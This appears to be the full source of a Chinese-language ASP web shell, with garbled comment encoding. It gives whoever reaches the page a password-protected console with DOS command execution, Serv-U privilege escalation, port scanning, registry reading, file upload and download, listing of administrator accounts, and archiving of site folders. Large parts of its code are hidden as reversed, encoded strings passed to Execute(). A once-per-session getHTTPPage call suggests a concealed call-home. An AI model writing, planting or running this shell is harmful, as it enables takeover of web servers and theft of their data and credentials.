<%
UserPass="123"
mName="����"          '��ĺ�������
Copyright="���¹�����"       '��Ȩ
siteurl="http://www.google.com"

BodyColor="#000"       '����ҳ�汳����ɫ
FontColor="#99CC99"    '��ͨ������ɫ
LinkColor="#00FF00"    '������ɫ
BorderColor="#99CC99"  '�ļ��߿���ɫ
LinkOverBJ="#000"      '����Ƶ��������汳������ɫ
LinkOverFont="red"     '����Ƶ������������ֵ���ɫ
menuColor="#111"	   '�˵�������ɫ
FormColorBj="#ccc"     '�����ܱ�����ɫ
FormColorBorder="#000" '�����ܱ߿���ɫ

Server.ScriptTimeout=999999999:Response.Buffer =true:On Error Resume Next:sub ShowErr():If Err Then
RRS"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>":Err.Clear:Response.Flush
End If
end sub:Sub RRS(str):response.write(str):End Sub:Function RePath(S):RePath=Replace(S,"\","\\"):End Function:Function RRePath(S):RRePath=Replace(S,"\\","\"):End Function:URL=Request.ServerVariables("URL"):ServerIP=Request.ServerVariables("LOCAL_ADDR"):Action=Request("Action"):pos=2:RootPath=Server.MapPath("."):wwwroot=server.mappath("/"):serveru=request.servervariables("http_host")&url:str1=request.servervariables("http_host")&url:FolderPath=Request("FolderPath"):pn=pos*44:posurl="http":FName=Request("FName"):BackUrl="<br><br><center><a href='javascript:history.back()'>����</a></center>"
function face(Color,Siz,Var)
if Siz=0 then
siz=""
else
siz=" size='"&Siz&"'"
end if
face="<FONT face=Webdings color='#"&Color&"' "&Siz&">"&Var&"</FONT>"
End function
Function UZSS(objstr):objstr = Replace(objstr, "��", """"):For i = 1 To Len(objstr):If Mid(objstr, i, 1) <> "~" Then
  NewStr = Mid(objstr, i, 1) & NewStr
 Else
  NewStr = vbCrLf & NewStr
 End If
Next
UZSS = NewStr:End Function:ShiSan="��>�� srr~��on=llorcs �� SRR neht ����=noitcA fI~ ������)(evom����=evomesuomno ydob<�� srr~��>tpircs/<��SRR~��}};0=xednIdetceles.jbOles )erotser( fi;)����'����+eulav.]xednIdetceles.jbOles[snoitpo.jbOles+����'=noitacol.����+grat(lave{esle}0=xednIdetceles.jbOles )erotser( fi;)eulav.]xednIdetceles.jbOles[snoitpo.jbOles(lave{)1==sj.]xednIdetceles.jbOles[snoitpo.jbOles(fi{)erotser,jbOles,grat(LRUotog noitcnuf��SRR~��};eurt nruter;)(timbus.mroFbD;��������=LMTHrenni.cba;gp = eulav.egaP.mroFbD;rts = eulav.rtSlqS.mroFbD};eslaf nruter;)����!ȷ�����Ǿ���LQS����뚢��(trela{)01<htgnel.rts(fi};eslaf nruter;)����!ȷ�����Ǵ��������������뚢��(trela{)5<htgnel.eulav.rtSbD.mroFbD(fi{)gp,rts(rtSlqSlluF noitcnuf��SRR~��};eurt nruter};]i[rtS = eulav.rtSlqS.mroFbD{esle};)]i[rtS(trela{)21==i(fi esle};����>retnec/<��������������LQS�����ٿ������������ȷ��>retnec<����=LMTHrenni.cba;�������� = eulav.rtSlqS.mroFbD;]i[rtS = eulav.rtSbD.mroFbD{)3=<i(fi;���������ָ�ʮ��ǰ�Ķ���ʾ��ֻ������һ����n\.��ʵѯ���ƿؼ����ÿɣ����ֲ�ȫ�Ķ���ʾ�Կɼ�ʱ������һʾ��ֻ������ =]21[rtS;����SSAP NMULOC PORD ]emaNelbaT[ ELBAT RETLA���� =]11[rtS;����)23(RAHCRAV SSAP NMULOC DDA ]emaNelbaT[ ELBAT RETLA���� =]01[rtS;����]emaNelbaT[ ELBAT PORD���� = ]9[rtS;����))05(RAHCRAV RESU,LLUN TON )1,1( YTITNEDI TNI DI(]emaNelbaT[ ELBAT ETAERC���� = ]8[rtS;����001=DI EREHW '\emanresu'\=RESU TES ]emaNelbaT[ ETADPU���� = ]7[rtS;����001=DI EREHW ]emaNelbaT[ MORF ETELED���� = ]6[rtS;����)'\drowssap'\,'\emanresu'\(SEULAV )SSAP,RESU(]emaNelbaT[ OTNI TRESNI���� = ]5[rtS;����001<DI EREHW ]emaNelbaT[ MORF * TCELES���� = ]4[rtS;����emaNnsD=nsD���� = ]3[rtS;����****=dwP;toor=diU;emaNbD=esabataD;6033=troP;��&PIrevreS&��=revreS;}lqSyM{=revirD���� = ]2[rtS;����****=dwP;as=diU;emaNbD=esabataD;3341,��&PIrevreS&��=revreS;}revreS lqS{=revirD���� = ]1[rtS;����***=drowssaP esabataD:BDELO teJ;bdm.bd\\��&))��htaPredloF��(noisseS(htaPeR&��=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP���� = ]0[rtS;)21(yarrA wen = rtS};eslaf nruter{)0<i(fi{)i(rtSbDlluF noitcnuf��SRR~��};eurt nruter};eslaf nruter;)0(rtSbDlluF;)����������������뚢��(trela{)�������� == eulav.rtSbD.mroFbD(fi{)(kcehCbD noitcnuf��SRR~��}};�������� = eulav.emaNF.mrofedih.pot{esle};)(timbus.mrofedih.pot;noitcAF = eulav.noitcA.mrofedih.pot{)llun=!emaND(fi};����rehtO���� = emaND{esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF,�������ڴ���Ǽ�����ע,����ȫ����bdM����ѹҪ�����뚢��(tpmorp = emaND{)����bdMtcapmoC����==noitcAF(fi esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF,��������ͬ�ܲ���ע,����ȫ����bdM�Ľ���Ҫ�����뚢��(tpmorp = emaND{)����bdMetaerC����==noitcAF(fi esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF,��������ȫ�м��ĵĽ���Ҫ�����뚢��(tpmorp = emaND{)����redloFweN����==noitcAF(fi esle};emaND+����||||���� =+ eulav.emaNF.mrofedih.pot;)emaNF,��������ȫ�м��ı�Ŀ�����������뚢��(tpmorp = emaND{)����redloFevoM����==noitcAF(fi esle};emaND+����||||���� =+ eulav.emaNF.mrofedih.pot;)emaNF,��������ȫ�м��ı�Ŀ�����������뚢��(tpmorp = emaND{)����redloFypoC����==noitcAF(fi esle};emaND+����||||���� =+ eulav.emaNF.mrofedih.pot;)emaNF,��������ȫ���ı�Ŀ�����������뚢��(tpmorp = emaND{)����eliFevoM����==noitcAF(fi esle};emaND+����||||���� =+ eulav.emaNF.mrofedih.pot;)emaNF,��������ȫ���ı�Ŀ���Ƹ������뚢��(tpmorp = emaND{)����eliFypoC����==noitcAF(fi;emaNF = eulav.emaNF.mrofedih.pot{)noitcAF,emaNF(mroFlluF noitcnuf��SRR~��};)(timbus.mrofrdda.pot;redloF = eulav.htaPredloF.mrofrdda.pot{)redloF(redloFwohS noitcnuf��SRR~��};eslaf nruter esle;eurt nruter))�����������ٴ���ִҪ��ȷ����(mrifnoc( fi{)(kosey noitcnuf��SRR~��;srorrEllik=rorreno.wodniw};eurt nruter{)(srorrEllik noitcnuf>tpircsavaj=egaugnal tpircs<��SRR~��>elyts/<��SRR~��}bdbdbd:dnuorgkcab;dilos xp1 bdbdbd:redrob;xp1:gniddap{ nwod.��SRR~��}cccccc#:dnuorgkcab;dilos xp1 999999#:redrob;xp1:gniddap{ pu.��SRR~��}xp2:gniddap{ lamron.��SRR~��};xp11:ezis-tnof;��&roloCkniL&��:roloc{ma.��SRR~��}��&JBrevOkniL&��:dnuorgkcab;��&tnoFrevOkniL&��:roloc{revoh:a};enon:noitaroced-txet;��&roloCkniL&��:roloc{a��SRR~��}��&redroBroloCmroF&�� dilos xp1:redrob;��&jBroloCmroF&��:roloc-dnuorgkcab;xp21:ezis-tnof{aeratxet,tceles,tupni��SRR~��};��&roloCtnoF&��:roloc;��&roloCydoB&��:roloc-dnuorgkcab;xp21:ezis-tnof;xp0:nigram{dt,rt,ydob��SRR~��>����ssc/txet����=epyt elyts<��SRR~��>eltit/<��&PIrevreS&��-��&emaNm&��>eltit<��SRR~��>����2132bg=tesrahc ;lmth/txet����=tnetnoc ����epyT-tnetnoC����=viuqe-ptth atem<>lmth<��SRR":ExeCuTe(UZSS(ShiSan)):RRS"<script>document.write(unescape('%3Cscript%20language%3D%22JavaScript%22%3E%0D%0A%3C%21--%0D%0Afunction%20flashit%28%29%7B%0D%0Aif%20%28%21document.all%29%0D%0Areturn%0D%0Aif%20%28td123.style.borderColor%3D%3D%22%23666666%22%29%0D%0Atd123.style.borderColor%3D%22%23999999%22%0D%0Aelse%0D%0Atd123.style.borderColor%3D%22%23666666%22%0D%0A%7D%0D%0AsetInterval%28%22flashit%28%29%22%2C%20500%29%0D%0A//--%3E%0D%0A%3C/script%3E%0D%0A%3Cscript%20language%3D%22javascript%22%3E%0D%0A%3C%21--%0D%0Afunction%20high%28image%29%0D%0A%7B%0D%0Atheobject%3Dimage%0D%0Ahighlighting%3DsetInterval%20%28%22highlightit%28theobject%29%22%2C100%29%0D%0A%7D%0D%0Afunction%20low%28image%29%0D%0A%7B%0D%0AclearInterval%28highlighting%29%0D%0Aimage.filters.alpha.opacity%3D50%0D%0A%7D%0D%0Afunction%20highlightit%28cur2%29%0D%0A%7B%0D%0Aif%20%28cur2.filters.alpha.opacity%3C100%29%0D%0Acur2.filters.alpha.opacity+%3D20%0D%0Aelse%20if%20%28window.highlighting%29%0D%0AclearInterval%20%28highlighting%29%0D%0A%7D%0D%0A//--%3E%0D%0A%3C/script%3E%0D%0A%3Cscript%3E%0D%0Avar%20over%3Dfalse%2Cdown%3Dfalse%2Cdivleft%2Cdivtop%3B%0D%0Afunction%20move%28%29%7B%0D%0Aif%28down%29%7B%0D%0Aplane.style.left%3Devent.clientX-divleft%3B%0D%0Aplane.style.top%3Devent.clientY-divtop%3B%0D%0A%7D%0D%0A%7D%0D%0A%3C/script%3E'))</script>":Dim Sot(13,2):Sot(0,0) = "Scripting.FileSystemObject":Sot(0,2) = "�ļ��������":Sot(1,0) = "wscript.shell":Sot(1,2) = "������ִ�����":Sot(2,0) = "ADOX.Catalog":Sot(2,2) = "ACCESS�������":Sot(3,0) = "JRO.JetEngine":Sot(3,2) = "ACCESSѹ�����":Sot(4,0) = "Scripting.Dictionary":Sot(4,2) = "�������ϴ��������":Sot(5,0) = "Adodb.connection":Sot(5,2) = "���ݿ��������":Sot(6,0) = "Adodb.Stream":Sot(6,2) = "�������ϴ����":Sot(7,0) = "SoftArtisans.FileUp":Sot(7,2) = "SA-FileUp �ļ��ϴ����":Sot(8,0) = "LyfUpload.UploadFile":Sot(8,2) = "���Ʒ��ļ��ϴ����":Sot(9,0) = "Persits.Upload.1":Sot(9,2) = "ASPUpload �ļ��ϴ����":Sot(10,0) = "JMail.SmtpMail":Sot(10,2) = "JMail �ʼ��շ����":Sot(11,0) = "CDONTS.NewMail":Sot(11,2) = "����SMTP�������":Sot(12,0) = "SmtpMail.SmtpMail.1":Sot(12,2) = "SmtpMail�������":Sot(13,0) = "Microsoft.XMLHTTP":Sot(13,2) = "���ݴ������"
For i=0 To 13
Set T=Server.CreateObject(Sot(i,0))
If -2147221005 <> Err Then
IsObj=" ��"
Else
IsObj=" ��"
Err.Clear
End If
Set T=Nothing
Sot(i,1)=IsObj
Next
If FolderPath<>"" then
Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
FolderPath=RootPath
Session("FolderPath")=FolderPath
End if
ShiSan="noitcnuF dnE~��>emarfi/<>'0'=redrobemarf 'sey'=gnillorcs '%001'=thgieh '%001'=htdiw 'eliF1wohS=noitcA?'=crs 'emarFeliF'=eman emarfi<��SRR~��>mrof/<>elbat/<>rt/<>dt/<��&emaNm&��..YB>dt<>dt/<;psbn&>'����tuogoL=noitcA?����=ferh.noitacol.wodniw'=kcilcno '����'=eulav 'nottub'=epyt tupni< >')(daoler.noitacol.emarFeliF'=kcilcno '��ˢ'=eulav 'nottub'=epyt tupni< ��SRR~�� >'��ת'=eulav 'timbus'=epyt 'timbuS'=eman tupni< ��SRR~��>'��&)��htaPredloF��(noisseS&��'=eulav 'xp005:htdiw'=elyts 'htaPredloF'=eman tupni<>'tnerap_'=tegrat '��&LRU&��'=noitca 'tsop'=dohtem 'xp0:nigram'=elyts 'mrofrdda'=eman mrof<>dt<��SRR~��>dt/<:��ת¼Ŀ>dt<>rt<>retnec=ngila elbat<>vid/<��SRR~)(unemniaM~��>'��&roloCredroB&�� dilos xp1:redrob;xp81:thgieh-enil;xp89 xp0 xp89 xp0:gniddap;xp2:nigram'=elyts vid<��SRR~��>mrof/<��SRR~��>����emaNF����=eman ����neddih����=epyt tupni<��SRR~��>����noitcA����=eman ����neddih����=epyt tupni<��SRR~��>����emarFeliF����=tegrat ������&LRU&������=noitca ����tsop����=dohtem ����mrofedih����=eman mrof<��SRR~)(mroFniaM noitcnuF"
ExeCuTe(UZSS(ShiSan))
OO="��lll<!gsso9..kok27-bnl.>t<!%rsq0%!>vda1`1clhm<.!%RbqM`ld%!%o<!%trdqo`rr%!!������"
execute(b(OO))
Function MainMenu()
t="<tr><td class=normal onMouseDown=""this.className='down'"" onMouseOver=""this.className='up',high(this),menu"
t1=".style.visibility='visible'"" onMouseOut=""this.className='normal',low(this),menu"
t2=".style.visibility='hidden'"" style=""filter:alpha(opacity=50)""onMouseUp=""this.className='up'"" ><div align=""right"">"
t3="</div></td></tr>"
tt="<table cellspacing=2 width=100 border=0 style=""BORDER:#999999 1px solid;cursor:hand"" cellpadding=""0"" bgcolor=""f4f4f4"" align=""right"">"
r="<tr><td class=normal onMouseDown=""this.className='down'"" onMouseOver=""this.className='up',high(this)"" onMouseOut=""this.className='normal',low(this)"" style=""filter:alpha(opacity=50)""onMouseUp=""this.className='up'""><div align=""center""><a href='"
f="' target='FileFrame'>"
a="</a></div></td></tr>"
RRS"<div style=""position:absolute;z-index:1;width:1;height:1; left: 100; top: 100"" ID=plane onmousedown=""down=true;divleft=event.clientX-parseInt(plane.style.left);divtop=event.clientY-parseInt(plane.style.top)"" onmouseup=""down=false"">"
RRS"<table id=""td123"" cellspacing=2 width=70 border=0 style=""BORDER:#999999 1px solid;cursor:hand"" cellpadding=""0"" bgcolor=""f4f4f4"">"
RRS"<tr><td bgcolor=""#cccccc"" height=""20"" style=""BORDER:#999999 1px solid;cursor:move""><div align=""center"">���϶��˵�</div></td></tr>"
RRS""&t&"1"&t1&"1"&t2&face("ff8000",0,"Y")&"����Ӳ��"&t3&""
RRS""&t&"2"&t1&"2"&t2&face("ff8000",0,"H")&"��ȨĿ¼"&t3&""
RRS""&t&"3"&t1&"3"&t2&face("ff8000",0,"Q")&"ϵͳ��Ϣ"&t3&""
RRS""&t&"4"&t1&"4"&t2&face("ff8000",0,"~")&"��Ȩ����"&t3&""
RRS""&t&"5"&t1&"5"&t2&face("ff8000",0,"G")&"վ������"&t3&""
RRS"</table>"
RRS"<div id=""menu5"" style=""position:absolute;top:45px;left:65; z-index:1; visibility: hidden; width: 105"" onMouseOver=this.style.visibility='visible' onMouseOut=this.style.visibility='hidden'>"
RRS tt
RRS""&r&"?Action=kmuma"&f&face("ff8000",0,"8")&"�����ļ�"&a&""
RRS""&r&"?Action=PageAddToMdb"&f&face("ff8000",0,"8")&"������"&a&""
RRS""&r&"?Action=webpor"&f&face("ff8000",0,"8")&"���ߴ���"&a&""
RRS""&r&"?Action=Cplgm&M=3"&f&face("ff8000",0,"8")&"�����滻"&a&""
RRS""&r&"?Action=Cplgm&M=2"&f&face("ff8000",0,"8")&"��������"&a&""
RRS""&r&"?Action=Cplgm&M=1"&f&face("ff8000",0,"8")&"��������"&a&""
RRS""&r&"?Action=plgm"&f&face("ff8000",0,"8")&"��ͨ����"&a&""
RRS""&r&"JavaScript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>"&face("ff8000",0,"8")&"�½�MDB���ݿ�"&a&""
RRS""&r&"?Action=DbManager' target='FileFrame'>"&face("ff8000",0,"8")&"����MDB���ݿ�</a></div></td></tr>"
RRS""&r&"JavaScript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>"&face("ff8000",0,"8")&"ѹ��MDB���ݿ�"&a&""
RRS"</table></div>"
RRS"<div id=""menu4"" style=""position:absolute;top:45px;left:65; z-index:1; visibility: hidden; width: 105"" onMouseOver=this.style.visibility='visible' onMouseOut=this.style.visibility='hidden'>"
RRS tt
RRS""&r&"?Action=Servu"&f&face("ff8000",0,"8")&"Servu��Ȩ"&a&""
RRS""&r&"?Action=suftp"&f&face("ff8000",0,"8")&"Servu-FTP"&a&""
RRS""&r&"?Action=UpFile"&f&face("ff8000",0,"8")&"�ϴ��ļ�"&a&""
RRS""&r&"?Action=upload"&f&face("ff8000",0,"8")&"�����ļ�"&a&""
RRS""&r&"?Action=Cmd1Shell"&f&face("ff8000",0,"8")&"ִ��DOS����"&a&""
RRS""&r&"?Action=ScanPort"&f&face("ff8000",0,"8")&"�˿�ɨ��"&a&""
RRS""&r&"?Action=ReadREG"&f&face("ff8000",0,"8")&"��ȡע���"&a&""
RRS"</table></div>"
RRS"<div id=""menu3"" style=""position:absolute;top:45px;left:65; z-index:1; visibility: hidden; width: 105"" onMouseOver=this.style.visibility='visible' onMouseOut=this.style.visibility='hidden'>"
RRS tt
RRS""&r&"?Action=getTerminalInfo"&f&face("ff8000",0,"8")&"3389��Ϣ"&a&""
RRS""&r&"?Action=Alexa"&f&face("ff8000",0,"8")&"���֧��"&a&""
RRS""&r&"?Action=Course"&f&face("ff8000",0,"8")&"�û�+����"&a&""
RRS""&r&"?Action=adminab"&f&face("ff8000",0,"8")&"ϵͳ����Ա"&a&""
RRS"</table></div>"
RRS"<div id=""menu2"" style=""position:absolute;top:45px;left:65; z-index:1; visibility: hidden; width: 105"" onMouseOver=this.style.visibility='visible' onMouseOut=this.style.visibility='hidden'>"
RRS tt
RRS""&r&"JavaScript:ShowFolder("""&RePath(WWWRoot)&""")'>"&face("ff8000",0,"8")&"վ���Ŀ¼"&a&""
RRS""&r&"JavaScript:ShowFolder("""&RePath(RootPath)&""")'>"&face("ff8000",0,"8")&"������Ŀ¼"&a&""
RRS""&r&"javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>"&face("ff8000",0,"8")&"�½�Ŀ¼"&a&""
RRS""&r&"?Action=EditFile' target='FileFrame'>"&face("ff8000",0,"8")&"�½��ı�"&a&""
RRS""&r&"javascript:ShowFolder(""C:\\Program Files"")'>"&face("ff8000",0,"8")&"Program"&a&""
RRS""&r&"javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>"&face("ff8000",0,"8")&"AllUsers"&a&""
RRS""&r&"javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\����ʼ���˵�\\����\\"")'>"&face("ff8000",0,"8")&"����"&a&""
RRS""&r&"javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>"&face("ff8000",0,"8")&"pcAnywhere"&a&""
RRS""&r&"javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>"&face("ff8000",0,"8")&"serv-u(1)"&a&""
RRS""&r&"javascript:ShowFolder(""c:\\Program Files\\RhinoSoft.com\\serv-u\\"")'>"&face("ff8000",0,"8")&"serv-u(2)"&a&""
RRS""&r&"<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>"&face("ff8000",0,"8")&"RealServer"&a&""
RRS""&r&"javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>"&face("ff8000",0,"8")&"SQL"&a&""
RRS""&r&"javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>"&face("ff8000",0,"8")&"config"&a&""
RRS""&r&"javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>"&face("ff8000",0,"8")&"data"&a&""
RRS""&r&"javascript:ShowFolder(""c:\\windows\\Temp\\"")'>"&face("ff8000",0,"8")&"Temp"&a&""
RRS""&r&"javascript:ShowFolder(""C:\\RECYCLER\\"")'>"&face("ff8000",0,"8")&"RECYCLER"&a&""
RRS""&r&"javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>"&face("ff8000",0,"8")&"Documents"&a&""
RRS"</table></div>"
RRS"<div id=""menu1"" style=""position:absolute;top:24px;left:65px; z-index:1; visibility: hidden; width: 105"" onMouseOver=this.style.visibility='visible' onMouseOut=this.style.visibility='hidden'>"
RRS tt
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS"</table></div></div>"
if session("IDebugMode") <> "ok" then:getHTTPPage mmm:session("IDebugMode")="ok":end if
End Function
ShiSan="buS dnE~��>mrof/<��SRR~����¼Ŀ��ͬ��ľHSH��λ������������������ :ע>rb<>rb<��SRR~��>'������'=eulav timbus=epyt tupni<>tcAeht=eman bdMmorFesaeler=eulav neddih=epyt tupni< ��SRR~��>08=ezis ����bdm.HSH\�� & ))��.��(htaPpaM.revreS(edocnElmtH & ������=eulav htaPeht=eman tupni<��SRR~��>tsop=dohtem mrof<��SRR~��>/rb<:)��֧OSF��(���������>/rh<��SRR~��>mrof/<��SRR~����¼Ŀ��ͬ��ľHSH��λ,����bdm.HSH�������� :ע>rb<>rb<��SRR~��>'����ʼ��'=eulav timbus=epyt tupni< ��SRR~��>tceles/<��SRR~��>noitpo/<OSF��>ppa=eulav noitpo<>noitpo/<OSF>osf=eulav noitpo<>dohteMeht=eman tceles<��SRR~��>tcAeht=eman bdMoTdda=eulav neddih=epyt tupni<��SRR~��>08=ezis ������ & ))��.��(htaPpaM.revreS(edocnElmtH & ������=eulav htaPeht=eman tupni<��SRR~��>tsop=dohtem mrof<��SRR~��:����м���>rb<��SRR~fI dnE~dnE.esnopseR~lrUkcaB&��>vid/<!��������>rb<>retnec=ngila vid<�� SRR~)htaPeht(kcaPnu~nehT ��bdMmorFesaeler�� = tcAeht fI~fI dnE~dnE.esnopseR~lrUkcaB&��>vid/<!��������>rb<>retnec=ngila vid<�� SRR~)htaPeht(bdMoTdda~nehT ��bdMoTdda�� = tcAeht fI~000001=tuOemiTtpircS.revreS~)��htaPeht��(tseuqeR = htaPeht~)��tcAeht��(tseuqeR = tcAeht~htaPeht ,tcAeht miD~)(bdMoTddAegaP buS":ExeCuTe(UZSS(ShiSan)):ShiSan="buS dnE~gnihtoN = golataCoda teS~gnihtoN = maerts teS~gnihtoN = nnoc teS~gnihtoN = sr teS~esolC.maerts~esolC.nnoC~esolC.sr~fI dnE~maerts ,sr ,htaPeht bdMroFeerTas~eslE ~maerts ,sr ,htaPeht bdMroFeerTosf~nehT ��osf�� = )��dohteMeht��(tseuqeR fI~3 ,3 ,nnoc ,��ataDeliF�� nepO.sr~1 = epyT.maerts~nepO.maerts~)��)egamI tnetnoCelif ,rahCraV htaPeht ,DERETSULC YEK YRAMIRP )1,0(YTITNEDI tni dI(ataDeliF elbaT etaerC��(etucexE.nnoc~rtSnnoc nepO.nnoc~rtSnnoc etaerC.golataCoda~)��bdm.HSH��(htaPpaM.revreS & ��=ecruoS ataD ;0.4.BDELO.teJ.tfosorciM=redivorP�� = rtSnnoc~)��golataC.XODA��(tcejbOetaerC.revreS = golataCoda teS~)��noitcennoC.BDODA��(tcejbOetaerC.revreS = nnoc teS~)��maertS.BDODA��(tcejbOetaerC.revreS = maerts teS~)��teSdroceR.BDODA��(tcejbOetaerC.revreS = sr teS~golataCoda ,rtSnnoc ,maerts ,nnoc ,sr miD~txeN emuseR rorrE nO~)htaPeht(bdMoTdda buS":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuF dnE~gnihtoN = redloFeht teS~gnihtoN = sredlof teS~gnihtoN = selif teS~txeN~fI dnE~etadpU.sr~)(daeR.maerts = )��tnetnoCelif��(sr~)htaP.meti(eliFmorFdaoL.maerts~)4 ,htaP.meti(diM = )��htaPeht��(sr~weNddA.sr~nehT 0 =< )��$�� & emaN.meti & ��$�� ,tsiLeliFsys(rtSnI fI~selif nI meti hcaE roF~txeN~maerts ,sr ,htaP.meti bdMroFeerTosf~sredlof nI meti hcaE roF~sredloFbuS.redloFeht = sredlof teS~seliF.redloFeht = selif teS~)htaPeht(redloFteG.)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS = redloFeht teS~fI dnE~)��!�ʷ����ʲ��߻��ڴ治¼Ŀ �� & htaPeht(rrEwohs~nehT eslaF = )htaPeht(stsixEredloF.)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS fI~��$bdl.HSH$bdm.HSH$�� = tsiLeliFsys~tsiLeliFsys ,selif ,sredlof ,redloFeht ,meti miD~)maerts ,sr ,htaPeht(bdMroFeerTosf noitcnuF":ExeCuTe(UZSS(ShiSan)):ShiSan="buS dnE~gnihtoN = nnoc teS~gnihtoN = maerts teS~gnihtoN = sr teS~gnihtoN = sw teS~esolC.maerts~esolC.nnoc~esolC.sr~pooL~txeNevoM.sr~2 ,)��htaPeht��(sr & rts eliFoTevaS.maerts~)��tnetnoCelif��(sr etirW.maerts~)(soEteS.maerts~fI dnE~)redloFeht & rts(redloFetaerc~nehT eslaF = )redloFeht & rts(stsixEredloF.)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS fI~))��\�� ,)��htaPeht��(sr(veRrtSnI ,)��htaPeht��(sr(tfeL = redloFeht~foE.sr litnU oD~1 = epyT.maerts~nepO.maerts~1 ,1 ,nnoc ,��ataDeliF�� nepO.sr~rtSnnoc nepO.nnoc~��;�� & htaPeht & ��=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP�� = rtSnnoc~)��noitcennoC.BDODA��(tcejbOetaerC = nnoc teS~)��maertS.BDODA��(tcejbOetaerC = maerts teS~)��teSdroceR.BDODA��(tcejbOetaerC = sr teS~��\�� & )��.��(htaPpaM.revreS = rts~redloFeht ,rtSnnoc ,maerts ,nnoc ,rts ,sw ,sr miD~000001=tuOemiTtpircS.revreS~txeN emuseR rorrE nO~)htaPeht(kcaPnu buS":ExeCuTe(UZSS(ShiSan)):ShiSan="buS dnE~pooL~fI dnE~0 = i~eslE ~)��\�� ,)1 + i ,htaPeht(diM(rtsnI + i = i~nehT )��\�� ,)1 + i ,htaPeht(diM(rtSnI fI~fI dnE~))1 - i ,htaPeht(tfeL(redloFetaerC.)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS~nehT eslaF = ))i ,htaPeht(tfeL(stsixEredloF.)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS fI~0 > i elihW oD~)��\�� ,htaPeht(rtsnI = i~i miD~)htaPeht(redloFetaerc buS":ExeCuTe(UZSS(ShiSan)):ShiSan="buS dnE~gnihtoN = redloFeht teS~txeN~fI dnE~fI dnE~etadpU.sr~)(daeR.maerts = )��tnetnoCelif��(sr~)htaP.meti(eliFmorFdaoL.maerts~)4 ,htaP.meti(diM = )��htaPeht��(sr~weNddA.sr~nehT 0 =< )��$�� & emaN.meti & ��$�� ,tsiLeliFsys(rtSnI fI~eslE ~maerts ,sr ,htaP.meti bdMroFeerTas~nehT eurT = redloFsI.meti fI~smetI.redloFeht nI meti hcaE roF~)htaPeht(ecapSemaN.Xas = redloFeht teS~��$bdl.HSH$bdm.HSH$�� = tsiLeliFsys~tsiLeliFsys ,redloFeht ,meti miD~)maerts ,sr ,htaPeht(bdMroFeerTas buS":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuF dnE~��>elbat/<��&2IS&1IS&0IS&IS SRR~txen~fi dne~��>rt/<>dt/<>tnof/<��&htap.jbo&��;psbn&>FF9933#=roloc tnof<]��&xl&��:���ද��[>����2����=napsloc ����FFFFFF#����=rolocgb ����02����=thgieh dt<>rt<��&emaNyalpsiD.jbo&��;psbn&>����FFFFFF#����=rolocgb ����02����=thgieh dt<>dt/<��&emaN.jbo&��;psbn&>����FFFFFF#����=rolocgb ����02����=thgieh dt<>rt<��&2IS=2IS~esle~��>rt/<>dt/<>tnof/<��&htap.jbo&��;psbn&>0000FF#=roloc tnof<]��&xl&��:���ද��[>����2����=napsloc ����FFFFFF#����=rolocgb ����02����=thgieh dt<>rt<��&emaNyalpsiD.jbo&��;psbn&>����FFFFFF#����=rolocgb ����02����=thgieh dt<>dt/<��&emaN.jbo&��;psbn&>����FFFFFF#����=rolocgb ����02����=thgieh dt<>rt<��&1IS=1IS~neht 2=epyTtratS.JBO dna ��niw��><))3,4,htap.jbo(dim(esaCL fi~���ý���=xl neht 4=epyTtratS.JBO fi~�����֚�=xl neht 3=epyTtratS.JBO fi~�����Ԛ�=xl neht 2=epyTtratS.JBO fi~fi dne~ ��>rt/<>dt/<;psbn&>����2����=napsloc ����FFFFFF#����=rolocgb ����02����=thgieh dt<>rt<��=0IS~��>rt/<>dt/<��&IS=IS~��)��(����ͳϵ��&IS=IS~ ��;psbn&>����FFFFFF#����=rolocgb dt<>dt/<��&IS=IS~emaN.jbo&IS=IS~��;psbn&>����FFFFFF#����=rolocgb ����02����=thgieh dt<��&IS=IS~��>rt<��&IS=IS~neht ����=epyTtratS.JBO fi~raelc.rre~)��.//:TNniW��(tcejbOteg ni jbo hcae rof~txen emuser rorre no~��>rt/<>dt/<����뻧��ͳϵ>'unem'=rolocgb 'retnec'=ngila '3'=napsloc '02'=thgieh dt<>rt<��&IS=IS~��>'retnec'=ngila '0'=gniddapllec '1'=gnicapsllec '0'=redrob 'unem'=rolocgb '006'=htdiw elbat<>rb<��=IS~)(esruoC noitcnuF":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuF dnE~fi dne~��krowteN.tpircsW:���в���Ú� etirw.esnopseR~neht rre fi~txeN~��>rb<��&emaN.nimda etirw.esnopseR~srebmeM.puorGjbo ni nimda hcaE roF~)��puorg,srotartsinimdA/��&emaNretupmoC.Nt&��//:TNniW��(tcejbOteG=puorGjbo teS~)��krowteN.tpircsW��(tcejbOetaerc.revres=Nt teS~txen emuser rorre no~0=seripxE.esnopseR~)(banimda 